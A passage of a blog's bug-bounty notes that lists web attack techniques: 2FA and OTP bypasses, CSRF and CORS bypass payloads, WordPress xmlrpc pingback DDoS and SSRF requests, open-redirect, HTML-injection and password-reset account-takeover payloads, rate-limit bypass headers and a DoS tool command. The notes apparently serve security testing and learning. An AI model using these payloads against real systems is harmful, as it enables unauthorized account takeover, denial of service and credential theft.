change Change Security Question Use git recon or google recon to find sensitive data (depends on luck :)) Token leaks in response: For registration: Intercept the signup request that contains data you have entered. Click on action -&gt; do -&gt; intercept response to this request. Click forward. Check response it that contains any link,any token or otp(one-time password). For password reset: Intercept the forget password option. Click on action -&gt; do -&gt; intercept response to this request. Click forward. Check response it that contains any link,any token or otp. Application level DoS Email bounce issues: ref: https://infosecwriteups.com/an-unexpected-bounty-email-bounce-issues-b9f24a35eb68 Long password DoS: Test in Forgot Password Page n Change Password, cuz the registration usually have length limit but others don’t. Use a password around 150-200 words to check if there has length limit. Then choose a longer password n keep checking the response time, to see if the app crashes for few seconds. reason: The long password will cause a problem while hashing it for storing in dataset. Long string DoS: Create app and put field like username or address or even profile picture name parameter (second reference) like 1000 character of string . Search A’s account from B’s account either it will either keeping searching for long time or crash(500 Error code).ref: https://shahjerry33.medium.com/long-string-dos-6ba8ceab3aa0https://hackerone.com/reports/764434 Authentication bypass 2FA bypass Response Manipulation change the response value of (eg: login) success to ‘true’ from ‘false’ Status Code Manipulation change the status code from 4xx to 200 to see if if can bypass 2FA Code Leakage in Response check the response of the 2FA Code Triggering Request to see if the code is leaked JS File Analysis (rare) some JS files may contain info about the 2FA code 2FA Code Reusability same code can be reused Lack of Brute-Force Protection (possible) Missing 2FA Code Integrity Validation Code for any user acc can be used to bypass the 2FA CSRF on 2FA Disabling signup for two account -&gt; Login into attacker account &amp; capture the disable 2FA request -&gt; generate CSRF POC with .HTML extension -&gt; Login into victim account and fire the request — — -&gt; It disable 2FA which leads to 2FA Bypass. Password Reset Disable 2FA 2FA gets disabled on password change/email change Backup Code Abuseref: https://medium.com/@surendirans7777/2fa-bypass-techniques-32ec135fb7fe Clickjacking on 2FA Disabling Page misleading victim to disable the 2FA for the 2FA disabling page Enabling 2FA doesn’t expire Previously active Sessions if the previous session is hijacked n app has session timeout vlun Bypass 2FA with null or 000000 enter null or 000000 to bypass OTP bypass by repeating requests create an acc with a non-existing ph num intercept the request n send to repeater n forward change the non-existing num to attacker num, get the OTP n register that non-existing numref: https://medium.com/@AGNIHACKERS/otp-bypass-through-response-manipulation-beeb467359d8 OTP bypass via response manipulation change any status, false, error, 0, to true, success, 1. And see if it can bypass the OTPref: https://medium.com/@MAALP/authentication-bypass-using-response-manipulation-6c33eb1257ac Broken-link hijacking Broken-link hijacking manual check the external link broken-link-checker* blc -rof --filter-level 3 https://example.com/ register the broken link or try to get that username or url extra ways:* https://ahrefs.com/broken-link-checker * https://brokenlinkcheck.com/ Broken auth and session management Session based bugs Old session does not expire log in the account through two browser(eg. firefox n chrome) change pwd or reset pwd on one browser, then refresh the other browser to see if still logged in Session hijacking (intended behavior) login the acc copy all cookies n logout paste the cookies n refresh Password reset link token not expire (insecure configurability) create acc, request a forget pwd link don’t use it, instead, change the email to new one now use the forget pwd link to sent info to the old email n see if pwd is able to change Server security misconfiguration login, play around n logout, goback one page, see if acc is logged in or can view pages limits to the user Bypassing CSP CSP (Content Security Policy) bypass ref: https://kathan19.gitbook.io/howtohunt/bypassing-csp/csp_bypass CMS Wordpress Wordpress Detection Wappalyzer WhatRuns BuildWith General Scan Tool WpScan xmlrpc.php one of the common issue on wp, to get credit, u need to fully exploit n show the impact. detection: site.com/xmlrpc.php Get the error message about POST request only exploitref: https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/https://the-bilal-rizwan.medium.com/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32 Intercept the request and change the method GET to POST List all Methods1234&lt;methodCall&gt;&lt;methodName&gt;system.listMethods&lt;&#x2F;methodName&gt;&lt;params&gt;&lt;&#x2F;params&gt;&lt;&#x2F;methodCall&gt; pingback.ping DDoS 1234567&lt;methodCall&gt;&lt;methodName&gt;pingback.ping&lt;&#x2F;methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http:&#x2F;&#x2F;&lt;YOUR SERVER &gt;:&lt;port&gt;&lt;&#x2F;string&gt;&lt;&#x2F;value&gt;&lt;&#x2F;param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http:&#x2F;&#x2F;&lt;SOME VALID BLOG FROM THE SITE &gt;&lt;&#x2F;string&gt;&lt;&#x2F;value&gt;&lt;&#x2F;param&gt;&lt;&#x2F;params&gt;&lt;&#x2F;methodCall&gt; pingback.ping SSRF (internal PORT scan only) 1234567&lt;methodCall&gt;&lt;methodName&gt;pingback.ping&lt;&#x2F;methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http:&#x2F;&#x2F;&lt;YOUR SERVER &gt;:&lt;port&gt;&lt;&#x2F;string&gt;&lt;&#x2F;value&gt;&lt;&#x2F;param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http:&#x2F;&#x2F;&lt;SOME VALID BLOG FROM THE SITE &gt;&lt;&#x2F;string&gt;&lt;&#x2F;value&gt;&lt;&#x2F;param&gt;&lt;&#x2F;params&gt;&lt;&#x2F;methodCall&gt; toolsxmlrpc-scan https://github.com/nullfil3/xmlrpc-scan CVE-2018-6389 (wp &lt;= 4.9.3) detection https://gist.github.com/remonsec/4877e9ee2b045aae96be7e2653c41df9 exploit use DDoS (Doser https://github.com/quitten/doser.py) 1python3 doser.py -t 999 -g &#39;https:&#x2F;&#x2F;site.com&#x2F;fullUrlFromLoadsxploit&#39; WP Cornjob DOS detection view site.com/wp-cron.php, You will see a Blank page with 200 HTTP status code exploit same tool as above (Doser) 1You will see a Blank page with 200 HTTP status code ref: https://medium.com/@thecpanelguy/the-nightmare-that-is-wpcron-php-ae31c1d3ae30 WP User Enumeration site.com/wp-json/wp/v2/users/ mostly not acceptable, can be used to extend the impact tho CORS CORS (ref: https://www.packetlabs.net/cross-origin-resource-sharing-cors/) misconfigured CORS hunting method 1 (single target) crawl the target website n search Access-Control using burp Try to add Origin Header i.e, Origin:attacker.com or Origin:null or Origin:attacker.target.com or Origin:target.attacker.com If origin is reflected in response means the target is vuln to CORS hunting method 2 (multiple means including subdomains) find alive subdomains (i.e, subfinder -d domain.com -o target.txt; grep alive: cat target.txt | httpx | tee -a alive.txt), send each subdomain into burp same as above method automated tools https://github.com/chenjj/CORScanner https://github.com/lc/theftfuzzer https://github.com/s0md3v/Corsy https://github.com/Shivangx01b/CorsMe CORS bypass Origin:null Origin:attacker.com Origin:attacker.target.com Origin:attackertarget.com Origin:sub.attackertarget.com Origin:attacker.com and then change the method Get to post/Post to Get Origin:sub.attacker target.com Origin:sub.attacker%target.com Origin:attacker.com/target.com https://twitter.com/trbughunters/status/1287023673845612546 https://twitter.com/Paresh_parmar1/status/1265251507655630848 https://www.corben.io/tricky-CORS/ https://medium.com/@virus0x01/cors-misconfiguration-leading-to-private-information-disclosure-3034cfcb4b93 CSRF CSRF https://kathan19.gitbook.io/howtohunt/csrf/csrf CSRF bypass -Change Request Method [POST =&gt; GET] -Remove Total Token Parameter -Remove The Token, And Give a Blank Parameter -Copy a Unused Valid Token , By Dropping The Request and Use That Token -Use Own CSRF Token To Feed it to Victim -Replace Value With Of A Token of Same Length -Reverse Engineer The Token -Extract Token via HTML injection -Switch From Non-Form Content-Type: application/json or Content-Type: application/x-url-encoded To Content-Type: form-multipart -Change/delete the last or frist character from the token -Change referrer to Referrer -Bypass the regex If the site is looking for “bank.com” in the referer URL, maybe “bank.com.attacker.com” or “attacker.com/bank.com” will work. -Remove the referer header (add this in your payload or html code) -Clickjacking (https://owasp.org/www-community/attacks/Clickjacking) Exploiting clickjacking on the same endpoint bypasses all CSRF protection. Because technically, the request is indeed originating from the legitimate site. If the page where the vulnerable endpoint is located on is vulnerable to clickjacking, all CSRF protection will be rendered irrelevant and you will be able to achieve the same results as a CSRF attack on the endpoint, albeit with a bit more effort. Finding CVEs CVEs 1.Grab all the subdomains i.e, subfinder -d domain.com | tee -a domains.txt 2.Grap all alive domains i.e, cat domains.txt | httpx -status-code | grep 200 | cut -d “ “ -f1 | tee -a alive.txt 3.Run nuclei basic-detection,panels,workflows,cves templates differently and store results in different file. i.e, cat alive.txt | nuclei -t nuclei-templates/workflows | tee -a workflows. 4.Read each output carefully with patience. 5.Find interest tech used by target. i.e, jira 6.put that link into browser check the version used by target. 7.Go on google search with jira version exploit. 8.grep the cves 9.Go to twitter in explore tab search CVE(that you found from google) poc or CVE exploit 10.Go to google and put cve or some details grab from twitter for a better poc read writeups related to that. 11.Try all cves if success report it.:) Check list Web application pentesting checklisthttps://kathan19.gitbook.io/howtohunt/checklist/web-application-pentesting-checklist Web checklist 2https://github.com/KathanP19/HowToHunt/blob/master/CheckList/Web_Checklist_by_Chintan_Gurjar.pdf Web checklist 3https://github.com/KathanP19/HowToHunt/blob/master/CheckList/mindmap.png Source code review code review tips important functions firstWhen reading source code, focus on important functions such as authentication, password reset, state-changing actions and sensitive info reads. (What is the most important would depend on the application.) Then, review how these components interact with other functionality. Finally, audit other less sensitive parts of the application. follow user inputAnother approach is to follow the code that processes user input. User input such as HTTP request parameters, HTTP headers, HTTP request paths, database entries, file reads, and file uploads provide the entry points for attackers to exploit the application’s vulnerabilities.This may also help us to find some critical vulnerabilities like xxe,xxs,sql injection hard-coded secrets n credentialsHard-coded secrets such as API keys, encryption keys and database passwords can be easily discovered during a source code review. You can grep for keywords such as “key”, “secret”, “password”, “encrypt” or regex search for hex or base64 strings (depending on the key format in use). use of dangerous functions n outdated dependenciesUnchecked use of dangerous functions and outdated dependencies are a huge source of bugs. Grep for specific functions for the language you are using and search through the dependency versions list to see if they are outdated. developer comments, hidden debug functionalities, configuration files, and the .git directoryThese are things that developers often forget about and they leave the application in a dangerous state. Developer comments can point out obvious programming mistakes, hidden debug functionalities often lead to privilege escalation, config files allow attackers to gather more information about your infrastructure and finally, an exposed .git directory allows attackers to reconstruct your source code. hidden paths, deprecated endpoints, and endpoints in developmentThese are endpoints that users might not encounter when using the application normally. But if they work and they are discovered by an attacker, it can lead to vulnerabilities such as authentication bypass and sensitive information leak, depending on the exposed endpoint. weak cryptography or hashing algorithmsThis is an issue that is hard to find during a black-box test, but easy to spot when reviewing source code. Look for issues such as weak encryption keys, breakable encryption algorithms, and weak hashing algorithms. Grep for terms like ECB, MD4, and MD5. missing security checks on user input and regex strengthReviewing source code is a great way to find out what kind of security checks are missing. Read through the application’s documentation and test all the edge cases that you can think of. A great resource for what kind of edge cases that you should consider is PayloadsAllTheThings.(github) missing cookie flagsLook out for missing cookie flags such as httpOnly and secure. unexpected behavior, conditionals, unnecessarily complex and verbose functionsAdditionally, pay special attention to the application’s unexpected behavior, conditionals, and complex functions. These locations are where obscure bugs are often discovered. EXIF geo data not stripped EXIF geo data not stripped (sensitive info leaked) toolshttp://exif.regex.info/exif.cgi File upload bypass File upload bypass bypassing normal extension sth.php.jpg or sth.jpg.php bypassing the magic byte validation polyglots Find origin IP find origin https://kathan19.gitbook.io/howtohunt/find-origin-ip/findorigin HTTP desync attack HTTP_Desync HTTP request smuggling how to doref: https://portswigger.net/web-security/request-smuggling/findinghttps://portswigger.net/web-security/request-smuggling/exploitinghttps://portswigger.net/research/http-desync-attacks-request-smuggling-rebornhttps://paper.seebug.org/1048/ toolshttps://github.com/defparam/smugglerhttps://github.com/PortSwigger/http-request-smuggler testing labhttps://portswigger.net/web-security/request-smuggling Host-header attack host-header https://kathan19.gitbook.io/howtohunt/host-header-attack/host-header HTML-injection HTML-injection Password reset links are usually addressed to your account name followed by the reset link. Also if the application allows you to have your account name with tags and special characters then you should try this. steps Create ur acc, edit the name to&lt;h1&gt;attacker&lt;/h1&gt; or &quot;abc&gt;&lt;h1&gt;attacker&lt;/h1&gt;and save it. request a password reset n check the reset email. see if the &lt;h1&gt; tag executed. tips HTML injection are usually considered as low to medium severity bugs but you can escalate the severity by serving a malicious link by using &lt;a href&gt; for eg:&lt;h1&gt;attacker&lt;/h1&gt;&lt;a href=&quot;your-controlled-domain&quot;Click here&lt;/a&gt; You can redirect the user to your malicious domain and serve a fake reset password page to steal credentials Also you can serve a previously found XSS page and steal user cookies etc. IDOR IDOR https://kathan19.gitbook.io/howtohunt/idor/idor JWT attack JWT https://kathan19.gitbook.io/howtohunt/jwt-attack/jwt_attack MFA bypass MFA bypasses https://kathan19.gitbook.io/howtohunt/mfa-bypass/mfa_bypasses 2FA bypass https://kathan19.gitbook.io/howtohunt/mfa-bypass/2fa_bypass Misconfigurations default credential n admin panel default credentials basicsdefault software configurations, ie.: 123456https:&#x2F;&#x2F;www.target.com&#x2F;adminhttps:&#x2F;&#x2F;www.target.com&#x2F;admin-consolehttps:&#x2F;&#x2F;www.target.com&#x2F;consolehttps:&#x2F;&#x2F;admin.target.comhttps:&#x2F;&#x2F;admin-console.target.comhttps:&#x2F;&#x2F;console.target.com get access from third party search the service default credentials if the admin is working on a third party bypass to get access to login page when visiting admin login page is denied, use header injection to bypass, eg, X-Orginal-URL: /admin or X-Rewrite-URL:/admin OAuth OAuth https://kathan19.gitbook.io/howtohunt/oauth/oauth Open redirection find OpenRedirect trick steps create an acc, record the user profile link, logout n clean all the cookies. paste n visit the profile link, it may redirect u to the login like https://samplesite.me/login?next=accounts/profile or https://samplesite.me/login?retUrl=accounts/profile try to exploit the parameter by adding an external domain eg: https://samplesite.me/login?next=https://evil.com/ or https://samplesite.me/login?next=https://samplesite.me@evil.com/ #or https://targetweb.com?url=www.targetweb.com.attackersite.com (with created subdomain) (to beat the bad regex filter) else, try the XSS eg: https://samplesite.me/login?next=javascript:alert(1);// Parameter pollution Parameter pollution in social sharing buttons find a social sharing button n get the sharing link. modified it from https://taget.com/how-to-hunt to such as https://taget.com/how-to-hunt?&amp;u=https://attacker.com/vaya&amp;text=another_site:https://attacker.com/vaya click the share button n see if the attack website is in the sharing contentPassword reset functionalityMindmap https://kathan19.gitbook.io/howtohunt/password-reset-functionality/password_reset_functionality password reset token leakage Sent a password reset request using forget password Check your email Copy your reset page link and paste in another tab and make burp intercept on. Look for every request if you find similar token that is in reset link with other domain like: bat.bing.com or facebook.com Then there is reset password token leakage. account takeover by password reset functionality email= &#118;&#x69;&#99;&#116;&#x69;&#109;&#x40;&#103;&#109;&#x61;&#x69;&#108;&#46;&#99;&#111;&#109;&amp;email=attacker@gmil.com email= &#118;&#105;&#99;&#116;&#x69;&#x6d;&#64;&#x67;&#109;&#97;&#105;&#x6c;&#x2e;&#99;&#111;&#x6d;%20email=attacker@gmil.com email= &#x76;&#x69;&#x63;&#116;&#105;&#109;&#x40;&#103;&#x6d;&#x61;&#x69;&#x6c;&#x2e;&#99;&#x6f;&#109; |email=attacker@gmil.com email= &#118;&#105;&#x63;&#116;&#105;&#x6d;&#x40;&#x67;&#109;&#97;&#105;&#108;&#x2e;&#99;&#111;&#x6d;%0d%0acc:&#97;&#116;&#x74;&#x61;&#x63;&#x6b;&#x65;&#114;&#x40;&#x67;&#x6d;&#x69;&#108;&#x2e;&#99;&#111;&#109; email= &#118;&#x69;&#99;&#x74;&#x69;&#109;&#x40;&#x67;&#x6d;&#x61;&#105;&#x6c;&#x2e;&#99;&#x6f;&#x6d;&amp;code= my password reset token Rate limit rate-limit bypass customizing HTTP methods change the GET request to POST, PUT, etc. bypassing rate-limit in API’s try HEAD method using header to bypass the rate limit(use the following just below the host header) 1234567891011X-Forwarded-For: IPX-Forwarded-IP: IPX-Client-IP: IPX-Remote-IP: IPX-Originating-IP: IPX-Host: IPX-Client: IP#or use double X-Forwarded-For headerX-Forwarded-For:X-Forwarded-For: IP addding headers to spoof IP add HTTP headers to spoof IP n evade detection 123456789101112X-Forwarded: 127.0.0.1X-Forwarded-By: 127.0.0.1X-Forwarded-For: 127.0.0.1X-Forwarded-For-Original: 127.0.0.1X-Forwarder-For: 127.0.0.1X-Forward-For: 127.0.0.1Forwarded-For: 127.0.0.1Forwarded-For-Ip: 127.0.0.1X-Custom-IP-Authorization: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1 bypass rate limit using special characters adding null byte (%00) at the end of the email try add a space after the email (not encoded) other characters can be tried to bypass rate limit %0d , %2e , %09 , %20 , %0, %00, %0d%0a, %0a, %0C add a slash (/) at the end of api endpointfromdomain.com/v1/login to domain.com/v1/login/eg: https://hackerone.com/reports/1067533 using IP rotate burp extensionother ref: https://kathan19.gitbook.io/howtohunt/rate-limit/ratelimitbypass Recon recon workflowhttps://kathan19.gitbook.io/howtohunt/recon/workflow subdomain enumerationhttps://kathan19.gitbook.io/howtohunt/recon/subdomain_enumeration SQLI SQL injection send request to burp scanner n proceed with active scan https://twitter.com/El3ctr0Byt3s/status/1302706241240731649 for getting hidden parameters Use subdomain enumeration tools on the domain. Gather all urls using hakcrawler, waybackurls, gau for the domain and subdomains. You can use the same method described above in 2nd point. Use Arjun to scan for the hidden params in the urls. Use –urls flag to include all urls. Check the params as https://domain.com?`=` Send request to file and process it through sqlmap. https://kathan19.gitbook.io/howtohunt/sqli/sql_injection","tags":[{"name":"Notes","slug":"Notes","permalink":"https://tsunamori.github.io/tags/Notes/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"110 Bug bounty","slug":"100-Cyber-security/110-Bug-bounty","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"},{"name":"119 Notes","slug":"100-Cyber-security/110-Bug-bounty/119-Notes","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/119-Notes/"}]}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"120 CTF","slug":"100-Cyber-security/120-CTF","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/"},{"name":"121 Web","slug":"100-Cyber-security/120-CTF/121-Web","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/121-Web/"},{"name":"128 IoT","slug":"100-Cyber-security/120-CTF/128-IoT","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/128-IoT/"},{"name":"128 ICS","slug":"100-Cyber-security/120-CTF/128-ICS","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/128-ICS/"},{"name":"500 IoT security","slug":"500-IoT-security","permalink":"https://tsunamori.github.io/categories/500-IoT-security/"},{"name":"510 Automotive security","slug":"500-IoT-security/510-Automotive-security","permalink":"https://tsunamori.github.io/categories/500-IoT-security/510-Automotive-security/"},{"name":"400 ICS security","slug":"400-ICS-security","permalink":"https://tsunamori.github.io/categories/400-ICS-security/"},{"name":"110 Bug bounty","slug":"100-Cyber-security/110-Bug-bounty","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"},{"name":"112 Ideas","slug":"100-Cyber-security/110-Bug-bounty/112-Ideas","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"},{"name":"119 Notes","slug":"100-Cyber-security/110-Bug-bounty/119-Notes","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/119-Notes/"},{"name":"140 Books","slug":"100-Cyber-security/140-Books","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/140-Books/"}],"tags":[{"name":"CTF, WriteUp","slug":"CTF-WriteUp","permalink":"https://tsunamori.github.io/tags/CTF-WriteUp/"},{"name":"CTF","slug":"CTF","permalink":"https://tsunamori.github.io/tags/CTF/"},{"name":"IoT","slug":"IoT","permalink":"https://tsunamori.github.io/tags/IoT/"},{"name":"ICS","slug":"ICS","permalink":"https://tsunamori.github.io/tags/ICS/"},{"name":"Summary","slug":"Summary","permalink":"https://tsunamori.github.io/tags/Summary/"},{"name":"Notes","slug":"Notes","permalink":"https://tsunamori.github.io/tags/Notes/"},{"name":"Tools","slug":"Tools","permalink":"https://tsunamori.github.io/tags/Tools/"},{"name":"Books","slug":"Books","permalink":"https://tsunamori.github.io/tags/Books/"}]}